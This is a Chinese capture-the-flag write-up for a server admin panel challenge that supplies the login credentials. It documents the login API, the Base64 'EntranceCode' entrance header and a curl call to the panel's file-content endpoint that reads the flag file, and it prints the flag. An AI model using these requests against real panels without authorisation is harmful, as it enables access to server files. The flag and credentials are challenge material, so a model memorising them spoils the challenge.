## 题目原文

> 请对目标服务器管理控制面板进行安全测试。用户名：`1panel` 密码：`1panel_password`

## 题解

### 入口与指纹

面板在 10086。登录接口是 `POST /api/v1/auth/login`，验证码来自 `GET /api/v1/auth/captcha`。题目给的账号是 `1panel` / `1panel_password`。同机还开着 22，这次没有用到。

### 关键观察

登录请求还要带安全入口。请求头 `EntranceCode` 是字符串 `entrance` 的 Base64，也就是 `ZW50cmFuY2U=`。验证码认的是图片上的四个字符，字段名是 `captcha` 和 `captchaID`。登录成功后 `Set-Cookie` 给出 `psession`。

### 利用链

用题目账号、验证码和 `EntranceCode` 登录，再用这个 cookie 读文件：

```bash
T=$(head -1 .target)
curl -sS -b 'psession=<登录返回的值>' -H 'EntranceCode: ZW50cmFuY2U=' \
  -H 'Content-Type: application/json' \
  -d '{"path":"/challenge/flag.txt"}' \
  "http://$T/api/v1/files/content"
```

本次 `data.content` 是 `flag{00faa560-d177-4975-8b82-d8cd6d4427c0}`。平台接受。

### flag 位置

`/challenge/flag.txt`，由文件内容接口返回。它不在登录响应里。
